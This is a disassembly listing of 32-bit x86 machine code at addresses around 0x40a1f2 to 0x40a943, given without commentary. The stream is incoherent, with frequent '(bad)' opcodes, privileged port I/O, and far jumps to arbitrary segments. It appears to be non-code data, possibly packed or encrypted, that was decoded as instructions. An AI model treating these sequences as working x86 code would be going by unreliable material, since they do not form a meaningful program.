  40a1f2:	cmp    ecx,edi
  40a1f4:	iret   
  40a1f5:	push   ebp
  40a1f6:	loop   0x40a268
  40a1f8:	mov    esp,0xa826214a
  40a1fd:	sbb    ecx,DWORD PTR [eax+0x7d]
  40a200:	into   
  40a201:	lahf   
  40a202:	enter  0x7c3f,0x32
  40a206:	ret    
  40a207:	sub    al,0x7b
  40a209:	test   ah,0x8c
  40a20c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a20d:	in     eax,0x5c
  40a20f:	mov    bh,0x15
  40a211:	popf   
  40a212:	pop    edx
  40a213:	mov    eax,ds:0xc9b42aa
  40a218:	(bad)  
  40a219:	pop    ebp
  40a21a:	cmp    ah,BYTE PTR [ebx+ebx*2+0x101937b7]
  40a221:	(bad)  
  40a222:	push   edi
  40a223:	xchg   ebx,eax
  40a224:	pinsrw mm5,WORD PTR [ebx],0x76
  40a228:	add    eax,0x10f7a3ec
  40a22d:	sbb    al,BYTE PTR [ebp-0x56dd99f]
  40a233:	mov    edi,0x9c027d19
  40a238:	out    dx,eax
  40a239:	pop    edi
  40a23a:	lahf   
  40a23b:	xchg   ecx,eax
  40a23c:	arpl   WORD PTR [esi],dx
  40a23e:	push   0x28589260
  40a243:	dec    esi
  40a244:	cmp    eax,0x617424d2
  40a249:	iret   
  40a24a:	das    
  40a24b:	lods   al,BYTE PTR ds:[esi]
  40a24c:	mov    WORD PTR [ecx+0x506be020],cs
  40a252:	rcr    ebp,cl
  40a254:	dec    ecx
  40a255:	imul   edx,DWORD PTR [ecx-0x2b],0x17c80b55
  40a25c:	ins    DWORD PTR es:[edi],dx
  40a25d:	scas   eax,DWORD PTR es:[edi]
  40a25e:	pusha  
  40a25f:	cmp    al,0xa6
  40a261:	inc    edx
  40a262:	test   eax,0x723440af
  40a267:	sti    
  40a268:	inc    edi
  40a269:	dec    ebx
  40a26a:	mov    edi,0xaea4b7a7
  40a26f:	js     0x40a2cc
  40a271:	lahf   
  40a272:	push   cs
  40a273:	push   esp
  40a274:	jnp    0x40a29f
  40a276:	lahf   
  40a277:	shl    BYTE PTR [ecx-0x43],cl
  40a27a:	outs   dx,DWORD PTR ds:[esi]
  40a27b:	adc    eax,0x8795f8da
  40a280:	inc    esi
  40a281:	ins    DWORD PTR es:[edi],dx
  40a282:	xchg   edx,eax
  40a283:	xchg   DWORD PTR [edi],esi
  40a285:	sub    BYTE PTR [ebp+0x5d],0xa
  40a289:	es jb  0x40a22c
  40a28c:	fnstcw WORD PTR [ebp+0x5]
  40a28f:	pop    edi
  40a290:	inc    edi
  40a291:	xor    eax,DWORD PTR [eax+0x5]
  40a294:	in     eax,dx
  40a295:	dec    ebp
  40a296:	cli    
  40a297:	sti    
  40a298:	mov    ?,esp
  40a29a:	mov    bh,0x5d
  40a29c:	into   
  40a29d:	aas    
  40a29e:	jne    0x40a22b
  40a2a0:	jbe    0x40a2ba
  40a2a2:	add    eax,0x8bd4eabc
  40a2a7:	adc    al,0x86
  40a2a9:	jbe    0x40a2a4
  40a2ab:	jae    0x40a292
  40a2ad:	popf   
  40a2ae:	or     al,0x7d
  40a2b0:	jbe    0x40a23f
  40a2b2:	adc    al,0xea
  40a2b4:	push   ebx
  40a2b5:	jle    0x40a2f9
  40a2b7:	leave  
  40a2b8:	je     0x40a334
  40a2ba:	add    DWORD PTR [edx-0x78bc97ca],ebp
  40a2c0:	mov    dh,0x88
  40a2c2:	aam    0x25
  40a2c4:	sbb    al,0xa0
  40a2c6:	rol    DWORD PTR [ebx+0x4b],0x44
  40a2ca:	sub    DWORD PTR ds:0xce7b6a4a,eax
  40a2d0:	bound  esp,QWORD PTR [ecx]
  40a2d2:	ror    ch,0xd4
  40a2d5:	push   0xffffffb1
  40a2d7:	jno    0x40a30f
  40a2d9:	cli    
  40a2da:	lods   al,BYTE PTR ds:[si]
  40a2dc:	leave  
  40a2dd:	adc    edx,0xac0217c5
  40a2e3:	push   eax
  40a2e4:	and    dh,BYTE PTR [esi+eax*8-0x366ba609]
  40a2eb:	loope  0x40a26d
  40a2ed:	and    BYTE PTR [eax+0x74805c4b],bl
  40a2f3:	test   DWORD PTR [ebx-0x56],ebp
  40a2f6:	pushf  
  40a2f7:	nop
  40a2f8:	nop
  40a2f9:	mov    bh,0x8f
  40a2fb:	dec    eax
  40a2fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a2fd:	shl    DWORD PTR [ebp+0x5e],0xf0
  40a301:	pop    esi
  40a302:	lods   eax,DWORD PTR ds:[esi]
  40a303:	push   esi
  40a304:	sbb    al,0x28
  40a306:	add    BYTE PTR [esi-0x1],0x44
  40a30a:	hlt    
  40a30b:	fnsave [ebx*8-0x37468816]
  40a312:	jp     0x40a344
  40a314:	xchg   ebp,eax
  40a315:	adc    ebp,DWORD PTR [edx-0x46c3f37e]
  40a31b:	push   0x840609f0
  40a320:	es in  eax,0x52
  40a323:	push   esp
  40a324:	inc    ebp
  40a325:	and    edi,DWORD PTR [edi+0x6cbc7bc]
  40a32b:	add    al,0x7e
  40a32d:	xor    dh,BYTE PTR cs:[ebx-0x71]
  40a331:	je     0x40a350
  40a333:	fistp  DWORD PTR [ecx-0x29]
  40a336:	xchg   edx,eax
  40a337:	rcl    BYTE PTR [esi-0x2f3bc13b],1
  40a33d:	out    0x8e,al
  40a33f:	(bad)  
  40a340:	sub    al,0x84
  40a342:	daa    
  40a343:	xor    cl,bl
  40a345:	and    DWORD PTR ds:0xadff847b,edx
  40a34b:	je     0x40a370
  40a34d:	jno    0x40a338
  40a34f:	push   esi
  40a350:	inc    ebx
  40a351:	dec    esi
  40a352:	adc    ebx,DWORD PTR [esi+0x65]
  40a355:	xor    ebx,ebx
  40a357:	sub    al,0xcb
  40a359:	dec    esi
  40a35a:	xor    ebx,DWORD PTR [ebp-0x76c4995f]
  40a360:	pop    edx
  40a361:	nop
  40a362:	je     0x40a3ad
  40a364:	into   
  40a365:	or     BYTE PTR [esi+0x4d9cee1b],0x27
  40a36c:	mov    esi,0xc0a28400
  40a371:	loop   0x40a3b5
  40a373:	sbb    BYTE PTR [edi+0x2f9dbd55],cl
  40a379:	ds sar eax,0xe4
  40a37d:	rol    BYTE PTR [edi-0x415d4418],0x28
  40a384:	jle    0x40a34b
  40a386:	scas   eax,DWORD PTR es:[edi]
  40a387:	or     ebx,DWORD PTR [edx]
  40a389:	sbb    eax,0x40eb42bc
  40a38e:	or     BYTE PTR [edi+0x5a2609d5],al
  40a394:	(bad)  
  40a395:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a396:	adc    DWORD PTR [edi],0xd7c16080
  40a39c:	sar    BYTE PTR [ecx+0x6d29169f],1
  40a3a2:	cwde   
  40a3a3:	cli    
  40a3a4:	(bad)  
  40a3a5:	out    0x52,eax
  40a3a7:	ins    DWORD PTR es:[edi],dx
  40a3a8:	cmp    BYTE PTR ds:0xcde41c27,0x4c
  40a3af:	xor    bl,BYTE PTR [eax+esi*8-0x10eb0df9]
  40a3b6:	xchg   BYTE PTR [ecx],ah
  40a3b8:	sub    BYTE PTR [edx-0x75],0x12
  40a3bc:	stc    
  40a3bd:	ret    0x8389
  40a3c0:	xor    eax,0x1108b351
  40a3c5:	mov    edi,0x39acdb1d
  40a3ca:	push   esp
  40a3cb:	outs   dx,BYTE PTR ds:[esi]
  40a3cc:	jl     0x40a3e9
  40a3ce:	push   esi
  40a3cf:	call   FWORD PTR [esp+eiz*4-0x7b]
  40a3d3:	or     edi,DWORD PTR [esi-0x52]
  40a3d6:	std    
  40a3d7:	icebp  
  40a3d8:	fs xor edi,esp
  40a3db:	retf   0xe7c6
  40a3de:	mov    esp,0xa7df1db6
  40a3e3:	mov    bl,0xc
  40a3e5:	(bad)  
  40a3e6:	cli    
  40a3e7:	pop    esi
  40a3e8:	pop    ecx
  40a3e9:	imul   ebx,DWORD PTR [ecx-0x48050415],0xffffff9c
  40a3f0:	xor    DWORD PTR [eax],esp
  40a3f2:	lods   eax,DWORD PTR ds:[esi]
  40a3f3:	xor    ebp,DWORD PTR [esi-0x16]
  40a3f6:	mov    eax,0x57bb9f3a
  40a3fb:	push   ds
  40a3fc:	xor    DWORD PTR [esi],edx
  40a3fe:	repz jge 0x40a3c5
  40a401:	retf   
  40a402:	jl     0x40a428
  40a404:	shl    bh,cl
  40a406:	push   cs
  40a407:	mov    dl,0xb
  40a409:	(bad)  
  40a40a:	out    0x53,al
  40a40c:	outs   dx,BYTE PTR ds:[esi]
  40a40d:	xlat   BYTE PTR ds:[ebx]
  40a40e:	call   0x9fd429d
  40a413:	push   esp
  40a414:	cmp    al,ah
  40a416:	les    di,DWORD PTR [edi-0x56b5dfe4]
  40a41d:	cdq    
  40a41e:	(bad)
  40a421:	sub    al,0xa6
  40a423:	mov    ebx,0x24c8a9c
  40a428:	add    eax,0xf232ef5a
  40a42d:	mov    eax,ds:0x2a28c882
  40a432:	and    DWORD PTR [eax-0x34],0x60
  40a436:	dec    eax
  40a437:	push   eax
  40a438:	bound  esi,QWORD PTR [esp+eax*1+0x26ddeab3]
  40a43f:	inc    esi
  40a440:	fdivr  st(3),st
  40a442:	aam    0x5f
  40a444:	fstp   DWORD PTR [ecx]
  40a446:	dec    esi
  40a447:	or     al,0x8c
  40a449:	adc    DWORD PTR [esi+0x65],ebp
  40a44c:	and    al,0x33
  40a44e:	push   0x40ec14c
  40a453:	fwait
  40a454:	adc    bh,BYTE PTR ds:0x5a4ca815
  40a45a:	(bad)  
  40a45b:	call   0x9981:0xde7bd2c7
  40a462:	sbb    BYTE PTR [ecx],ah
  40a464:	aam    0xd6
  40a466:	push   DWORD PTR ss:[esi+0x71]
  40a46a:	add    eax,0x7450f149
  40a46f:	push   edx
  40a470:	scas   al,BYTE PTR es:[edi]
  40a471:	pop    ds
  40a472:	cdq    
  40a473:	(bad)  
  40a474:	mov    ah,ah
  40a476:	div    cl
  40a478:	(bad)  
  40a479:	and    al,0xae
  40a47b:	clc    
  40a47c:	jmp    0xb615990a
  40a481:	rol    BYTE PTR [eax],1
  40a483:	xchg   DWORD PTR [ecx],ebp
  40a485:	xchg   BYTE PTR [esi-0x6b926ec4],dl
  40a48b:	xchg   esp,eax
  40a48c:	jle    0x40a40f
  40a48e:	lods   eax,DWORD PTR ds:[esi]
  40a48f:	mov    ebp,0x433d1e27
  40a494:	aad    0x87
  40a496:	inc    edx
  40a497:	shl    DWORD PTR [ecx-0x6ccd81b3],cl
  40a49d:	les    ebp,FWORD PTR [edi+0x4b0bfc08]
  40a4a3:	lea    esi,[ebx]
  40a4a5:	mov    dh,0x59
  40a4a7:	std    
  40a4a8:	cmp    eax,edx
  40a4aa:	adc    ebx,DWORD PTR [edx+0x42]
  40a4ad:	retf   0xfbc
  40a4b0:	xchg   ecx,eax
  40a4b1:	and    BYTE PTR [edx],dh
  40a4b3:	xor    bh,dh
  40a4b5:	mov    eax,0x887d1611
  40a4ba:	jecxz  0x40a447
  40a4bc:	mov    DWORD PTR es:[eax+0x2a],edx
  40a4c0:	inc    ecx
  40a4c1:	xchg   edx,eax
  40a4c2:	or     DWORD PTR [eax+0x41],edx
  40a4c5:	mov    cl,0xd4
  40a4c7:	jnp    0x40a4cd
  40a4c9:	jge    0x40a4c5
  40a4cb:	sahf   
  40a4cc:	dec    edi
  40a4cd:	mov    al,gs:0x101b144f
  40a4d3:	cs or  BYTE PTR ss:[edx+0x15],bl
  40a4d8:	cmp    DWORD PTR [ebx-0xd],edi
  40a4db:	ret    0xd307
  40a4de:	jmp    0x40a48b
  40a4e0:	mov    al,0x7b
  40a4e2:	sbb    ch,BYTE PTR [edi]
  40a4e4:	push   esp
  40a4e5:	cdq    
  40a4e6:	test   BYTE PTR [edx-0x71bf8dde],dh
  40a4ec:	xor    al,0x1f
  40a4ee:	or     BYTE PTR [esi+0x1e],ch
  40a4f1:	lds    esp,FWORD PTR [ecx+esi*4]
  40a4f4:	add    ah,bh
  40a4f6:	pusha  
  40a4f7:	adc    eax,0x6b80687
  40a4fc:	stos   DWORD PTR es:[edi],eax
  40a4fd:	mov    ecx,0x65d2fe38
  40a502:	cs mov dh,0x6b
  40a505:	jmp    0x8d88:0xd879d460
  40a50c:	mov    edi,0xb4941759
  40a511:	xor    eax,0x8135d681
  40a516:	ins    DWORD PTR es:[edi],dx
  40a517:	dec    eax
  40a518:	mov    al,ds:0x735598a2
  40a51d:	jl     0x40a55b
  40a51f:	aad    0x3f
  40a521:	adc    BYTE PTR [edi-0x6],ah
  40a524:	cmp    BYTE PTR [eax],ch
  40a526:	fnstsw WORD PTR [ecx+ebp*4]
  40a529:	push   eax
  40a52a:	out    dx,eax
  40a52b:	out    0x46,eax
  40a52d:	mov    esi,DWORD PTR [edi-0x7dec312b]
  40a533:	js     0x40a4c0
  40a535:	mov    DWORD PTR [edi+0x2cc53950],edi
  40a53b:	icebp  
  40a53c:	addr16 jge 0x40a58b
  40a53f:	sub    BYTE PTR [ebp-0x80],ah
  40a542:	push   ss
  40a543:	inc    ebx
  40a544:	cli    
  40a545:	jmp    0x8136:0x83e1bb59
  40a54c:	call   0xce6a:0xd6ee4873
  40a553:	aam    0x40
  40a555:	inc    ebp
  40a556:	adc    DWORD PTR [ecx-0x1c],ecx
  40a559:	xchg   ebp,eax
  40a55a:	out    dx,al
  40a55b:	push   ebx
  40a55c:	loope  0x40a5c6
  40a55e:	xchg   ebp,eax
  40a55f:	ffreep st(2)
  40a561:	ss int 0x7d
  40a564:	je     0x40a50d
  40a566:	sbb    BYTE PTR [ebx-0x3],bl
  40a569:	test   al,0x36
  40a56b:	or     eax,0x3bad2c79
  40a570:	(bad)  
  40a571:	loope  0x40a4f4
  40a573:	cdq    
  40a574:	(bad)  
  40a575:	icebp  
  40a576:	fwait
  40a577:	pop    ebx
  40a578:	add    al,0x36
  40a57a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a57b:	es rcl ebp,1
  40a57e:	int    0xc4
  40a580:	mov    ds:0x2aa94d6e,al
  40a585:	mov    ds:0x6f92e811,eax
  40a58a:	xchg   ebx,eax
  40a58b:	add    BYTE PTR [ebx+0xd71961d],al
  40a591:	cdq    
  40a592:	scas   al,BYTE PTR es:[edi]
  40a593:	outs   dx,DWORD PTR ds:[esi]
  40a594:	dec    esi
  40a595:	je     0x40a54c
  40a597:	or     ebx,0x4c084714
  40a59d:	mov    ebx,gs
  40a59f:	call   0x8496:0x49abec7c
  40a5a6:	out    dx,al
  40a5a7:	push   edi
  40a5a8:	fst    QWORD PTR [esi+0x6c]
  40a5ab:	mov    al,ds:0xf1274155
  40a5b0:	xchg   ecx,eax
  40a5b1:	xchg   dl,dl
  40a5b3:	dec    ebx
  40a5b4:	pop    edi
  40a5b5:	inc    ebp
  40a5b6:	mov    esi,DWORD PTR [ecx+0x28b1f9a]
  40a5bc:	aas    
  40a5bd:	mov    ecx,0xd3e883c9
  40a5c2:	sahf   
  40a5c3:	outs   dx,DWORD PTR ds:[esi]
  40a5c4:	inc    edx
  40a5c5:	push   edx
  40a5c6:	mov    esi,0x894f63e0
  40a5cb:	xor    eax,0x7edde4a9
  40a5d0:	inc    edx
  40a5d1:	lds    ebx,FWORD PTR [ecx]
  40a5d3:	mov    al,ds:0x2cf1ca9a
  40a5d8:	xchg   ebp,eax
  40a5d9:	shl    DWORD PTR [ecx],0x12
  40a5dc:	aad    0x61
  40a5de:	jne    0x40a579
  40a5e0:	out    dx,eax
  40a5e1:	scas   eax,DWORD PTR es:[edi]
  40a5e2:	mov    ebp,0xcc2ec013
  40a5e7:	adc    eax,DWORD PTR [edi-0x2f35a883]
  40a5ed:	or     edx,ecx
  40a5ef:	fisttp WORD PTR [ebp+0x1717f729]
  40a5f5:	hlt    
  40a5f6:	jge    0x40a601
  40a5f8:	out    0xcc,eax
  40a5fa:	fcom   st(5)
  40a5fc:	dec    edi
  40a5fd:	pop    edi
  40a5fe:	jmp    0x1fc4:0x5b990484
  40a605:	add    al,dh
  40a607:	ss outs dx,BYTE PTR fs:[esi]
  40a60a:	pop    ecx
  40a60b:	xor    ah,BYTE PTR [eax+0x479cc873]
  40a611:	stc    
  40a612:	sub    edi,edx
  40a614:	ret    0xfef
  40a617:	(bad)  
  40a618:	gs add eax,0x2fae4bae
  40a61e:	retf   
  40a61f:	sbb    BYTE PTR [edx],dl
  40a621:	int    0xe4
  40a623:	stc    
  40a624:	mov    dh,0xf9
  40a626:	pop    eax
  40a627:	loopne 0x40a67f
  40a629:	pop    es
  40a62a:	jl     0x40a62d
  40a62c:	pop    eax
  40a62d:	cmp    ebp,ecx
  40a62f:	pop    es
  40a630:	push   edx
  40a631:	popf   
  40a632:	into   
  40a633:	mov    dh,0xd9
  40a635:	cwde   
  40a636:	mov    edi,0xd30fed98
  40a63b:	sbb    al,0xa9
  40a63d:	cld    
  40a63e:	adc    BYTE PTR [edx+0x2d],dl
  40a641:	or     eax,ebx
  40a643:	sub    al,0x5e
  40a645:	xor    eax,0xdd4fd81b
  40a64a:	(bad)  
  40a64b:	sti    
  40a64c:	clc    
  40a64d:	das    
  40a64e:	cmc    
  40a64f:	sub    bh,ah
  40a651:	scas   al,BYTE PTR es:[edi]
  40a652:	in     eax,dx
  40a653:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a654:	xor    ch,bh
  40a656:	fcom   DWORD PTR [ebp-0x5cecfdf]
  40a65c:	int3   
  40a65d:	jle    0x40a6c9
  40a65f:	test   eax,0x5fcc3b47
  40a664:	mov    ebp,0x832fa778
  40a669:	data16 jo 0x40a5f1
  40a66c:	(bad)  
  40a66d:	out    dx,al
  40a66e:	xor    BYTE PTR [ebx],0x25
  40a671:	test   BYTE PTR [eax],ah
  40a673:	(bad)  
  40a674:	or     BYTE PTR fs:[eax],dl
  40a677:	pop    esi
  40a678:	add    eax,edi
  40a67a:	mov    ebx,0x9d304f61
  40a67f:	mov    al,ds:0xd23391b1
  40a684:	fadd   st(1),st
  40a686:	retf   0x6b9a
  40a689:	outs   dx,BYTE PTR ds:[esi]
  40a68a:	cld    
  40a68b:	loope  0x40a648
  40a68d:	stc    
  40a68e:	cmp    dl,BYTE PTR [eax]
  40a690:	pop    ecx
  40a691:	xor    bl,bl
  40a693:	sahf   
  40a694:	je     0x40a6ce
  40a696:	xchg   edx,eax
  40a697:	sar    DWORD PTR [edx+0x4],0x83
  40a69b:	sahf   
  40a69c:	mov    al,ds:0x77e1f4ba
  40a6a1:	xor    al,0x2e
  40a6a3:	sub    esp,ebx
  40a6a5:	push   eax
  40a6a6:	sbb    al,0xf1
  40a6a8:	jp     0x40a6e9
  40a6aa:	inc    eax
  40a6ab:	xchg   DWORD PTR [edx+0xf79b730],esi
  40a6b1:	push   esp
  40a6b2:	shl    BYTE PTR [edi-0x41a7e298],cl
  40a6b8:	xchg   edi,eax
  40a6b9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a6ba:	dec    BYTE PTR [esi+esi*1-0x3a5ac706]
  40a6c1:	arpl   WORD PTR [esi],di
  40a6c3:	or     eax,0xc909e904
  40a6c8:	cs adc al,0xc9
  40a6cb:	out    dx,al
  40a6cc:	rcl    dx,0x78
  40a6d0:	mov    bl,0x7b
  40a6d2:	int3   
  40a6d3:	jo     0x40a72b
  40a6d5:	xor    esi,esi
  40a6d7:	sub    DWORD PTR [esi-0x1b],ebp
  40a6da:	push   eax
  40a6db:	outs   dx,WORD PTR ds:[esi]
  40a6dd:	std    
  40a6de:	call   0xe040:0x7da29e10
  40a6e5:	xchg   ecx,eax
  40a6e6:	jns    0x40a6a0
  40a6e8:	idiv   BYTE PTR [esi]
  40a6ea:	cmp    edx,ebx
  40a6ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a6ed:	daa    
  40a6ee:	xor    al,0x7
  40a6f0:	xor    al,0xac
  40a6f2:	ret    
  40a6f3:	sub    dh,al
  40a6f5:	(bad)  
  40a6f6:	into   
  40a6f7:	aam    0x4
  40a6f9:	lea    esp,[edi-0x7c]
  40a6fc:	imul   eax,DWORD PTR [ecx],0xb2d909a4
  40a702:	xor    edx,esi
  40a704:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a705:	dec    ecx
  40a706:	mov    es,WORD PTR [esp+ebp*4-0x3a]
  40a70a:	rol    DWORD PTR [ebx-0x64c5775],0x90
  40a711:	pop    esp
  40a712:	xchg   esi,eax
  40a713:	mov    bl,0xae
  40a715:	mov    edi,DWORD PTR [edx]
  40a717:	cld    
  40a718:	push   ds
  40a719:	jae    0x40a6a3
  40a71b:	xor    edx,DWORD PTR [ecx]
  40a71d:	iret   
  40a71e:	mov    bl,0x7a
  40a720:	xchg   ecx,eax
  40a721:	pop    ebx
  40a722:	repz into 
  40a724:	add    al,0xdb
  40a726:	push   ds
  40a727:	ficom  WORD PTR [ebx-0x66]
  40a72a:	jge    0x40a73e
  40a72c:	pusha  
  40a72d:	fimul  WORD PTR [eax]
  40a72f:	shl    DWORD PTR [edx-0x14acfec9],0x13
  40a736:	les    edx,FWORD PTR [edx+0xaf1665c]
  40a73c:	lahf   
  40a73d:	sbb    eax,0x92a3ab4f
  40a742:	xchg   bl,cl
  40a744:	adc    ecx,0xad01b6f1
  40a74a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a74b:	cld    
  40a74c:	outs   dx,BYTE PTR ds:[esi]
  40a74d:	lods   al,BYTE PTR ds:[esi]
  40a74e:	mov    edx,0xa6d6cbe0
  40a753:	dec    esi
  40a754:	pop    ebp
  40a755:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a756:	and    al,0xbf
  40a758:	mov    ah,0xed
  40a75a:	cwde   
  40a75b:	jno    0x40a777
  40a75d:	in     eax,0xb
  40a75f:	(bad)  
  40a760:	fwait
  40a761:	bound  edx,QWORD PTR [ebx-0x80]
  40a764:	pop    ecx
  40a765:	pusha  
  40a766:	dec    eax
  40a767:	loop   0x40a7b6
  40a769:	repz btr esi,edx
  40a76d:	push   ebx
  40a76e:	inc    edi
  40a76f:	les    esp,FWORD PTR [ebx]
  40a771:	rcl    DWORD PTR [ecx],1
  40a773:	pop    edi
  40a774:	mov    eax,cs:0x7156c552
  40a77a:	scas   eax,DWORD PTR es:[edi]
  40a77b:	out    dx,eax
  40a77c:	aam    0x6
  40a77e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a77f:	mov    eax,ds:0x165a6177
  40a784:	or     eax,0xa5a2348f
  40a789:	sbb    eax,edi
  40a78b:	jbe    0x40a7a1
  40a78d:	xchg   esp,eax
  40a78e:	ins    BYTE PTR es:[edi],dx
  40a78f:	pop    ds
  40a790:	leave  
  40a791:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a792:	pop    ebp
  40a793:	xchg   esp,eax
  40a794:	lods   eax,DWORD PTR ds:[esi]
  40a795:	in     eax,0x8c
  40a797:	call   0x39dc:0xa8829298
  40a79e:	mov    ecx,0x7362123e
  40a7a3:	xor    eax,ebp
  40a7a5:	mov    dh,0x38
  40a7a7:	(bad)  
  40a7a9:	je     0x40a752
  40a7ab:	cli    
  40a7ac:	sbb    dh,BYTE PTR [edi]
  40a7ae:	jp     0x40a7c1
  40a7b0:	adc    dh,BYTE PTR [ebp+0x60]
  40a7b3:	xor    al,0xe0
  40a7b5:	sub    DWORD PTR [eax-0x7963ff3c],ebx
  40a7bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a7bc:	push   0x1e04e3e8
  40a7c1:	add    DWORD PTR [ebx+0x54a1d232],esi
  40a7c7:	xlat   BYTE PTR ds:[ebx]
  40a7c8:	push   ds
  40a7c9:	aas    
  40a7ca:	dec    ebp
  40a7cb:	mov    ah,0xe1
  40a7cd:	mov    al,ds:0xc4a16360
  40a7d2:	clc    
  40a7d3:	xchg   esp,eax
  40a7d4:	inc    ecx
  40a7d5:	out    0xc9,eax
  40a7d7:	mov    edx,0xe2e322a6
  40a7dc:	jmp    0x40a7f4
  40a7de:	and    ebp,DWORD PTR [ecx+0x79]
  40a7e1:	jb     0x40a80e
  40a7e3:	ja     0x40a7ab
  40a7e5:	std    
  40a7e6:	xchg   ebx,eax
  40a7e7:	mov    gs,WORD PTR [ebx]
  40a7e9:	push   es
  40a7ea:	jge    0x40a83e
  40a7ec:	(bad)
  40a7f1:	ja     0x40a7bf
  40a7f3:	or     al,0xc0
  40a7f5:	(bad)  
  40a7f6:	mov    bh,0x67
  40a7f8:	aas    
  40a7f9:	repnz or eax,0x54cee927
  40a7ff:	test   al,0x30
  40a801:	mov    ds:0x88721ce6,al
  40a806:	std    
  40a807:	stos   DWORD PTR es:[edi],eax
  40a808:	(bad)  
  40a809:	xchg   ebp,eax
  40a80a:	call   0x9b5a612a
  40a80f:	ret    
  40a810:	or     bl,BYTE PTR [ebx-0x5]
  40a813:	das    
  40a814:	leave  
  40a815:	cmp    DWORD PTR [eax],ebx
  40a817:	cmc    
  40a818:	xor    dl,BYTE PTR [eax-0x33]
  40a81b:	cmp    BYTE PTR [edi-0x18],ah
  40a81e:	inc    edi
  40a820:	cmc    
  40a821:	pop    ss
  40a822:	lds    ebx,FWORD PTR [eax+0x54]
  40a825:	sbb    dh,BYTE PTR [ebp+0x40]
  40a828:	sbb    edx,esp
  40a82a:	adc    eax,0x8289070e
  40a82f:	add    al,0xa9
  40a831:	out    0x64,eax
  40a833:	repnz push es
  40a835:	retf   0x21dc
  40a838:	call   0xee30:0x46182d1b
  40a83f:	dec    eax
  40a840:	cs cmp dl,dl
  40a843:	push   es
  40a844:	cwde   
  40a845:	stos   BYTE PTR es:[edi],al
  40a846:	or     ebp,DWORD PTR [edi-0x6ab9285c]
  40a84c:	lock jp 0x40a7e1
  40a84f:	and    al,0xe4
  40a851:	mov    edi,0x54c541c3
  40a856:	ss ffreep st(0)
  40a859:	lahf   
  40a85a:	jb     0x40a852
  40a85c:	test   eax,0xd9843e27
  40a861:	xchg   BYTE PTR [eax-0x38cea201],ch
  40a867:	add    al,0xe
  40a869:	mov    eax,ds:0xf642fada
  40a86e:	pop    edx
  40a86f:	in     al,0x7c
  40a871:	bound  ebp,QWORD PTR [esi]
  40a873:	(bad)  
  40a874:	jnp    0x40a87d
  40a876:	add    esi,DWORD PTR [ebx-0x18c0859b]
  40a87c:	into   
  40a87d:	pop    ebp
  40a87e:	jecxz  0x40a8a1
  40a880:	in     al,0x55
  40a882:	test   BYTE PTR [ebx+esi*2],al
  40a885:	outs   dx,BYTE PTR ds:[esi]
  40a886:	xor    eax,0x30ec9b78
  40a88b:	bound  edi,QWORD PTR [ebp+0x1c33e513]
  40a891:	cld    
  40a892:	mov    al,ds:0x5a741baa
  40a897:	dec    esi
  40a898:	bt     DWORD PTR [ebx],esi
  40a89b:	inc    ecx
  40a89c:	xor    edx,ecx
  40a89e:	mov    WORD PTR [ebp-0x489a8f78],es
  40a8a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a8a5:	cmp    eax,DWORD PTR [edi]
  40a8a7:	les    edi,FWORD PTR [eax+0x6601828d]
  40a8ad:	lods   al,BYTE PTR ds:[esi]
  40a8ae:	push   ss
  40a8af:	rcl    dh,1
  40a8b1:	and    eax,0x73f5d66a
  40a8b6:	jbe    0x40a875
  40a8b8:	and    dl,cl
  40a8ba:	clc    
  40a8bb:	adc    bl,BYTE PTR [edx-0x4a]
  40a8be:	(bad)  
  40a8bf:	push   ebp
  40a8c0:	ds enter 0x183e,0xb9
  40a8c5:	adc    al,bl
  40a8c7:	lods   al,BYTE PTR ds:[esi]
  40a8c8:	cli    
  40a8c9:	or     ebx,DWORD PTR [ebx+edx*2]
  40a8cc:	daa    
  40a8cd:	mov    ebx,0x95234c05
  40a8d2:	jge    0x40a94c
  40a8d4:	lods   al,BYTE PTR ds:[esi]
  40a8d5:	mov    ?,WORD PTR ds:[eax-0x5a2bcf4a]
  40a8dc:	rcl    BYTE PTR [ecx],1
  40a8de:	inc    esp
  40a8df:	or     al,0x93
  40a8e1:	dec    ebp
  40a8e2:	cmp    DWORD PTR [eax],esi
  40a8e4:	and    eax,0x92f2daf6
  40a8e9:	sbb    BYTE PTR [ecx],bl
  40a8eb:	jno    0x40a95a
  40a8ed:	cdq    
  40a8ee:	ffree  st(0)
  40a8f0:	gs je  0x40a94e
  40a8f3:	jmp    0x40a8d3
  40a8f5:	push   ds
  40a8f6:	test   BYTE PTR [ebx],ah
  40a8f8:	sar    BYTE PTR [eax+0x29],1
  40a8fb:	out    dx,eax
  40a8fc:	int3   
  40a8fd:	mov    WORD PTR [edi-0x6d],ds
  40a900:	neg    DWORD PTR [esi]
  40a902:	js     0x40a8c2
  40a904:	sub    BYTE PTR [edx-0xb],cl
  40a907:	arpl   di,di
  40a909:	jmp    0x40a913
  40a90b:	(bad)  
  40a90c:	addr16 dec ebx
  40a90e:	sub    eax,0xc966c0b1
  40a913:	ins    DWORD PTR es:[edi],dx
  40a914:	fstp   TBYTE PTR [esi+0x2228318b]
  40a91a:	lods   eax,DWORD PTR ds:[esi]
  40a91b:	iret   
  40a91c:	mov    ebp,0xe159a061
  40a921:	cli    
  40a922:	ret    0x1c9e
  40a925:	repz push esp
  40a927:	xchg   esi,eax
  40a928:	xlat   BYTE PTR ds:[ebx]
  40a929:	rcr    DWORD PTR [esi],1
  40a92b:	xlat   BYTE PTR ds:[ebx]
  40a92c:	sub    al,0xe5
  40a92e:	sbb    eax,0x1840d187
  40a933:	sbb    eax,0x7a69f368
  40a938:	sar    DWORD PTR [edi-0x6d],1
  40a93b:	xchg   esp,eax
  40a93c:	push   ss
  40a93d:	push   edi
  40a93e:	test   eax,0x2368f84e
  40a943:	cmp    eax,0x2c85ebf0
